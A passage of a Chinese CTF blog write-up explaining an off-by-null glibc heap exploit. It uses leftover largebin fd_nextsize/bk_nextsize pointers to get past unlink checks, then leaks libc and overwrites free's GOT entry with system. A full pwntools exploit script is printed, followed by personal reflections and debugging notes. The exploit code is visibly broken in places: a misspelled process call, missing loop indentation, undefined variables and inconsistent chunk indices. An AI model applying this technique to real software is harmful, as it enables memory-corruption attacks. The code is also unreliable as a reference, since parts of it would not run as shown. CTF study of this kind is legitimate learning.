chunk的size位，也就是将fake chunk构建在chunk+0x10处。</p></li><li><p>然后处理fake chunk的fd和bk位。目的是以chunkA的<code>fd_nextsize</code>指针作为fake chunk的fd位，<code>bk_nextsize</code>指针作为fake chunk的bk。首先是fake chunk的fd位，把chunkA的<code>fd_nextsize</code>指针覆盖到一个可以控制的其bk位的 chunkB上，再伪造chunkB的bk位使其指向fake chunk即可。</p></li><li><p>对于fake chunk的bk位，按照检测，要触发unlink，bk必须指向fake chunk本身，也就是chunkA+0x10处，这里我们可以利用fastbin的特性，将一个fastbin chunk作为跳板绕过。</p></li><li><p>fake chunk构造完成后直接free chunkA，触发unlink，造成堆叠。可以利用它leak，然后改free got表。</p></li></ol><p>我们通过exp和图示来理清楚。</p><p>由于并没有开启地址随机化，所以地址的覆盖并不需要部分覆写。</p><p>前三步可以用下面的图表来说明：</p><p><img src="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>首先将tcache填满。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    delete(a)<br><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0x1020</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>delete(b)<br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>delete(c)<br></code></pre></td></tr></table></figure><p>然后让chunk21成为largebin chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;largebin chnuk0&#x27;</span>)<span class="hljs-comment">#chunk21</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;top&#x27;</span>)<span class="hljs-comment">#chunk22</span><br>delete(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;functional gadgets&#x27;</span>)<span class="hljs-comment">#chunk23,to push the chunk21 to largebin</span><br><span class="hljs-comment">#有关这一步的具体说明可以看Tcache部分。</span><br></code></pre></td></tr></table></figure><p>至此我们获得了一个0x500大小的largebin chunkA，此时这个chunkA的状态还是free。</p><p>然后我们要在chunkA的header开始伪造fake chunk。</p><p>这是比较关键的一部分。利用到了large bin遗留在内存上的<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针。以 <code>fd_nextsize</code> 为 fake_chunk 的 fd，<code>bk_nextsize</code> 为 fake_chunk 的 bk。但是我们首先需要绕过unlink的安全检测，即之前说过的<code>Fd-&gt;bk = p, BK-&gt;fd = p</code></p><p>ps：我们伪造的fake chunk是smallbin chunk，在bin中也是由双向链表维护。</p><p>我们分别为<code>FD-&gt;bk = p</code>和<code>BK-&gt;fd = p</code>进行绕过</p><p>首先是<code>FD-&gt;bk = p</code>的绕过。</p><p>回忆一下之前level1我们绕过的方法论，也就是：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">FD-&gt;<span class="hljs-attr">bk</span> = <span class="hljs-attr">p</span>   ==&gt; <span class="hljs-attr">bk_nextsize</span> = p<br></code></pre></td></tr></table></figure><p>所以我们的目的是让<code>bk_nextsize</code>指向fake chunk。</p><p><code>BK-&gt;fd = p</code>的绕过同理，等价于构造<code>fd_nextsize</code>，使它指向fake chunk。</p><p>但是有趣的是此时我们的largebin中只有一个largebin chunk，它的<code>fd_nextsize</code>,<code>bk_nextsize</code>本身就是指向chunk本身的。然而这样没有任何意义，我们需要修改<code>fd_nextsize</code>到我们需要的地方。</p><p>这便又是问题所在。我们需要找到一个方法使得修改<code>fd_nextsize</code>的同时又能绕过检测。</p><p>这里我们需要用到其他类型bin chunk的辅助。</p><p>我们可以很容易地控制<code>fd_nextsize</code>指向某个smallbin chunkC，而这个smallbin chunkC的fd也指向堆上的某个地址。我们又可以通过修改这个chunkC的fd指针使得它指向fake chunk。这样一来我们利用 chunkC充当中间角色，绕了一圈使得我们目的达成的同时也没有被检测绊住。</p><p><img src="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后来看实际操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x530</span>) + p64(chunkC_addr))<span class="hljs-comment">#fake chunk </span><br></code></pre></td></tr></table></figure><p>先申请一个chunkB，用来构造fake chunk的size和fd指针。这里fake chunk fd还只是指向chunkC，我们需要修改chunkC的fd指针使它指向fake chunk。</p><p>修改chunk header需要利用到悬垂指针。我们下一步应该是构造出chunkC的悬垂指针。</p><p>比如从 small bin中拿出的chunk，如果其bin中有多个chunk的话，那么拿出来的chunk的bk上必定残留了指针，因此可以进行覆盖。</p><p>这里稍微有一些能讲的基础知识。还是参见extra吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#28,off by null</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">23</span> + i)<span class="hljs-comment">#填充tcache</span><br></code></pre></td></tr></table></figure><p>多申请一些chunk。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">24</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">25</span>)</span></span><br>#将chunk24，<span class="hljs-number">25</span>free到fastbin<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x400,b<span class="hljs-string">&#x27;aa&#x27;</span>)</span></span>#<span class="hljs-number">28</span>，smallbin<br>#申请chunk28后fastbin里的两个chunk被放入small bin。这里的相关机制可以来看看extra。<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x28,p64(fake_chunk_addr)</span></span>)#<span class="hljs-number">24</span>，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址<br></code></pre></td></tr></table></figure><p>这样一来我们成功使得fd位指向fake chunk，并绕过了<code>FD-&gt;bk = p</code>   </p><p>然后是<code>bk_nextsize = p</code>的绕过：</p><p>因为<code>bk_nextsize</code>本身指向chunkA，我们还是需要伪造它使得<code>bk_nextsize</code>指向chunkA + 0x10。</p><p>对于这个检测我们依旧要利用到别的chunk的帮助</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">28</span> + i)<span class="hljs-comment">#填充tcache</span><br>    <br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)*<span class="hljs-comment">#23,Tcache</span><br><br>free(<span class="hljs-number">20</span>)<br>free(<span class="hljs-number">23</span>) <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br> add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x28</span>, p64(fake_chunk_addr))<br></code></pre></td></tr></table></figure><p>然后进行unlink。</p><p>unlink的触发实际上只需要用off by null向下一个chunk溢出空字节，再free被溢出的chunk就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(<span class="hljs-number">28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x520</span>))<br>delete(<span class="hljs-number">28</span>)<br></code></pre></td></tr></table></figure><p>整个过程的示意图如下：其中chunk ptr指large bin残留的指针。</p><p><img src="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = precess(<span class="hljs-string">&#x27;./summer2&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.29.so&#x27;</span>)<br>unlink_addr = <span class="hljs-number">0x6024b0</span><br>free_got_addr = <span class="hljs-number">0x4036E8</span><br>next_chunk_addr = unlink_addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>gdb.attach(r)<br>pause()<br><br><br><span class="hljs-comment">#----------------Tcache-------------------</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    delete(a)<br><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0x1020</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>delete(b)<br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>delete(c)<br><span class="hljs-comment">#-----------chunk constrution--------------</span><br><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;largebin chnuk0&#x27;</span>)<span class="hljs-comment">#chunk21</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;top&#x27;</span>)<span class="hljs-comment">#chunk22</span><br>delete(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;functional gadgets&#x27;</span>)<span class="hljs-comment">#chunk23,to push the chunk21 to largebin</span><br><br><span class="hljs-comment">#-------fake chunk construction------------</span><br><br>add(<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0x530</span>) + p64(chunkC_addr))<span class="hljs-comment">#fake chunk </span><br><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#28,off by null</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">23</span> + i)<span class="hljs-comment">#填充tcache</span><br><br><span class="hljs-comment">#-------FD-&gt;bk = p-------------------------</span><br>delete(<span class="hljs-number">24</span>)<br>delete(<span class="hljs-number">25</span>)<br><span class="hljs-comment">#将chunk24，25free到fastbin</span><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<span class="hljs-comment">#28，smallbin</span><br><span class="hljs-comment">#申请chunk28后fastbin里的两个chunk被放入small bin。</span><br>add(<span class="hljs-number">0x28</span>,p64(fake_chunk_addr))<span class="hljs-comment">#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址</span><br><span class="hljs-comment">#-------BK-&gt;fd = p-------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">28</span> + i)<span class="hljs-comment">#填充tcache</span><br>    <br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)*<span class="hljs-comment">#23,Tcache</span><br><br>free(<span class="hljs-number">20</span>)<br>free(<span class="hljs-number">23</span>) <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br> add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x28</span>, p64(fake_chunk_addr))<br><br><br><span class="hljs-comment">#-------unlink-----------------------------</span><br><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(<span class="hljs-number">28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x520</span>))<br>delete(<span class="hljs-number">28</span>)<br><br><span class="hljs-comment">#-------leak-------------------------------</span><br>show(<span class="hljs-number">21</span>)<br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>, p64(system_addr))<br>show(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4)总结"></a>4)总结</h2><p>不管是level0还是level1、level2，其实都是off by one庞大利用方式中比较基础的点。</p><p>level2的思路很有趣。</p><p>不管怎样万变不离其中，off by one/null可以导致一个字节的的溢出以修改chunk header，从而触发各种各样的漏洞利用。</p><h2 id="5）军训？考核？大冒险！"><a href="#5）军训？考核？大冒险！" class="headerlink" title="5）军训？考核？大冒险！"></a>5）军训？考核？大冒险！</h2><p>原本是计划三道题。一道full relro的ret2dl，一道多线程或者xtea加密的re，一道简单off by one（就是summer）。</p><p>在军训一天后觉得出三道题，这确实是不可能的事。累倒不累，主要是时间都是碎片化的不好利用。</p><p>当时考核发布的时候我们都觉得时间是充足的，能先花时间学考点而不是研究怎么做考核。实际上考核一公布我就写了summer的大概框架，之前没有怎么从源码层面上阅读堆题，甚至那个时候也是刚刚接触堆半个月，所以写得很艰难，大概花了一周的时间把程序完善。后来发现了一个很严重的非预期，觉得自己有点急于求成，对堆一知半解的就想出堆题是不是有点不识好歹了，就暂时放下了考核而开始研究堆题的考点。这期间我也一直认为军训完还有充足的时间来完善题目。</p><p>再后来三道题变成了一道题。</p><p>很遗憾没有在考核期间完成full relro的ret2dl。。不过有没有作为考核完成也不是特别重要了，我已经部分翻译了原文相关的部分，打算暑假认真调试一下。。。</p><p>大概七号的时候就完成了level0和1，本来最初计划就是这两个level的，但是不知道为什么想不开加了level2，学得很艰难。并且</p><p>感觉写的支离破碎的，说白了我的知识面不足以支撑我完全理解这个检测的绕过方法，所以一些东西写得十分离奇。比如通篇几乎没有用到edit功能，因为参考的wp的原题都是没有这个功能的。</p><p>很让我恼火的就是我对于largebin、smallbin还有Tcache的机制不甚熟悉，而解题中涉及到的堆指针覆写的很多姿势实际上都是基于这些bin特有的机制。</p><p>说实话有点惭愧，大一上我干了啥呢。啥也没干。</p><p>硬着头皮看🐟最早分享的长亭二进制入门课，那时我愿称之为天书。</p><p>做签到栈溢出，复制别人的exp打，搞半天都连接失败，死也打不通。</p><p>就跟忘记了当初为什么要学习二进制一样，我也忘记了当时为什么我要每天晚上看那个nep的直播课，忘记做考核的那种不做出来就跳楼的决心来自哪里。</p><p>相似地，我还忘记了我为什么要学pwn，而不是我比较憧憬的游戏安全。</p><p>就好像一件事情的发生通常拥有直接原因和根本原因，而我的一系列行径是没有直接原因的，并没有什么很直接的驱动力或者很特别的理由。</p><p>这是一件非常奇怪的事情。通常来说我是一个比较有明确目标的人，但是在这种关键的事情上我的选择却不是由我本人决断的。</p><p>这果然是一件非常奇怪的事情，硬要类比，可以来一句经典名言：” 爱也如此。”</p><h2 id="6）extra（慎重观看）"><a href="#6）extra（慎重观看）" class="headerlink" title="6）extra（慎重观看）"></a>6）extra（慎重观看）</h2><p>extra部分。</p><p>多为调试时遇到的环境问题或者一些懂的都懂不必多说的基础知识。</p><p>但是怕被说水考核就加上了。</p><p><strong>pps：平时文档写多了总有一种奇怪的引导的语气。。。要多具体有多具体的那种，所以废话以及不必要的操作巨多，慎重观看。</strong></p><p><strong>ppps：只要我的解题的思路的正文部分足够简略清爽，就不会有人说我拖泥带水（）</strong></p><h2 id="调试部分"><a href="#调试部分" class="headerlink" title="调试部分"></a>调试部分</h2><h3 id="1-1-解决gdb无法查看heap等信息的问题"><a href="#1-1-解决gdb无法查看heap等信息的问题" class="headerlink" title="1.1-解决gdb无法查看heap等信息的问题"></a>1.1-解决gdb无法查看heap等信息的问题</h3><p>指定libc加载后进行调试。发现gdb无法显示当前的堆块以及链表信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hea<br>heap: This <span class="hljs-built_in">command</span> only works with libc debug symbols.<br>They can probably be installed via the package manager of your choice.<br>See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html<br><br>E.g. on Ubuntu/Debian you might need to <span class="hljs-keyword">do</span> the following steps (<span class="hljs-keyword">for</span> 64-bit and 32-bit binaries):<br>sudo apt-get install libc6-dbg<br>sudo dpkg --add-architecture i386<br>sudo apt-get install libc-dbg:i386<br></code></pre></td></tr></table></figure><h5 id="1）通过pwntools加载带有dbg符号的libc"><a href="#1）通过pwntools加载带有dbg符号的libc" class="headerlink" title="1）通过pwntools加载带有dbg符号的libc"></a>1）通过pwntools加载带有dbg符号的libc</h5><p>加载带有<code>degub_symbols</code>的libc，一般来说是手动添加或者加载带有调试符号的libc，glibc官方文档对此进行了说明。</p><p>后者可以从清华镜像站下载。</p><p>这里花了一些时间重新了解了一写glibc链接库的一些知识。</p><p>更改后的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">r = process([<span class="hljs-string">&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>执行失败。报错是 <code>doesn&#39;t have any GOT symbols, skipping PLT</code></p><p>暂未找到解决方案。</p><h5 id="2）手动查看堆内存信息"><a href="#2）手动查看堆内存信息" class="headerlink" title="2）手动查看堆内存信息"></a>2）手动查看堆内存信息</h5><p>根据内存分布找到堆上数据的地址，然后通过<code>x/gx</code>命令手动查看。</p><p>那么如何找到堆数据具体的内存地址？</p><p>打开一个简单的堆题来参考。</p><p><img src="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到heap头地址在B008，比bss_end足足高了FA5。</p><p>所以并没有找到什么联系捏。。。</p><h5 id="3）手动编译degub版本的libc"><a href="#3）手动编译degub版本的libc" class="headerlink" title="3）手动编译degub版本的libc"></a>3）手动编译degub版本的libc</h5><p>下载相应的glibc源码并编译。</p><p>编译时需要开启debug</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mkdir build &amp;&amp; <span class="hljs-keyword">cd</span> biuld<br><span class="hljs-string">../configure</span> <span class="hljs-params">--prefix</span> = <span class="hljs-string">/usr/local/glibc-2.29</span> <span class="hljs-params">--enable-debug</span> = yes<br>make -j4 &amp;&amp; sudo make install<br><span class="hljs-comment">#64 bit</span><br></code></pre></td></tr></table></figure><p>编译完成后可以通过链接该库直接编译程序源代码。</p><p>如果需要用该版本链接库执行已编译的程序的话可以替换二进制文件解释器路径，但是必须修改程序二进制文件的程序头，将我们需要的ld路径写入。ld路径与libc中的ld路径必须匹配，否则会出错，导致系统指令无法执行。</p><p>然后更改LD_PRELOAD环境变量</p><h3 id="1-2-解决libc-so-6相关报错问题"><a href="#1-2-解决libc-so-6相关报错问题" class="headerlink" title="1.2-解决libc.so.6相关报错问题"></a>1.2-解决libc.so.6相关报错问题</h3><p>上述脚本执行后，python3报错，原因大致是没有<code>libc.so.6</code>文件。</p><p>查看对应文件夹发现情况属实。</p><p>解决方案是手动创建对应的<code>lib.so.6</code>文件。</p><h3 id="1-3-附加调试后的地址随机化问题。"><a href="#1-3-附加调试后的地址随机化问题。" class="headerlink" title="1.3-附加调试后的地址随机化问题。"></a>1.3-附加调试后的地址随机化问题。</h3><p>一个很奇怪的问题，环境是ubuntu18.04，libc默认2.27.</p><p>gdb直接调试程序，内存地址是固定的，但是一旦利用脚本进行附加调试就会出现地址随机化。</p><p>附加调试下的heap</p><p><img 